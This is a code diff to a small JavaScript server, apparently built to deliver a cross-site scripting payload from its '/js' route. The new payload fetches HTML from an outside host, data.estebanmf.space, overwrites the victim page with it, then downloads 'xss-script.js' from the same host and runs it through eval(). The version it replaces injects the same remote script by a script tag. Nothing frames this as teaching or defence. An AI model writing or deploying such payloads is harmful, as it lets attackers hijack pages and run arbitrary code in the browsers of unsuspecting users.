@@ -34,47 +34,26 @@ serve({
 
     if (url.pathname === "/js" && req.method === "GET") {
       const jsCode = `
-    console.log('Evaluating JS string');
-    fetch('https://data.estebanmf.space/xss')
-      .then(t => t.text())
-      .then(d => {
-        console.log('Fetched HTML:', d);
-        // Use existing <html> element
-        const html = document.documentElement;
-        const head = document.head || document.querySelector('head');
-        const body = document.body || document.querySelector('body');
-        // Clear existing <head> and <body>
-        while (head.firstChild) {
-          head.removeChild(head.firstChild);
-        }
-        while (body.firstChild) {
-          body.removeChild(body.firstChild);
-        }
-        // Set <title> in <head>
-        const title = document.createElement('title');
-        title.textContent = 'XSS';
-        head.appendChild(title);
-        // Append script to <head>
-        const script = document.createElement('script');
-        script.src = 'https://data.estebanmf.space/xss-script.js';
-        head.appendChild(script);
-        console.log('Script appended to head');
-        // Parse fetched HTML using DOMParser to avoid innerHTML
-        const parser = new DOMParser();
-        const parsedDoc = parser.parseFromString(d, 'text/html');
-        const fetchedBody = parsedDoc.querySelector('body');
-        if (!fetchedBody) {
-          console.error('No body found in fetched HTML');
-          return;
-        }
-        // Move all children from fetched <body> to existing <body>
-        Array.from(fetchedBody.children).forEach(child => {
-          body.appendChild(child);
-        });
-        console.log('Body content appended to existing body');
-      })
-      .catch(e => console.error('Fetch error:', e));
-  `;
+console.log('Evaluating JS string');
+fetch('https://data.estebanmf.space/xss')
+.then(t => t.text())
+.then(d => {
+console.log('Fetched HTML:', d);
+// Replace entire document content
+document.documentElement.innerHTML = d;
+console.log('Document HTML replaced');
+// Fetch and eval xss-script.js
+fetch('https://data.estebanmf.space/xss-script.js')
+.then(t => t.text())
+.then(script => {
+console.log('xss-script.js fetched, evaluating');
+eval(script);
+console.log('xss-script.js evaluated');
+})
+.catch(e => console.error('Script fetch error:', e));
+})
+.catch(e => console.error('HTML fetch error:', e));
+`;
       return new Response(jsCode, {
         headers: {
           "Content-Type": "application/javascript",
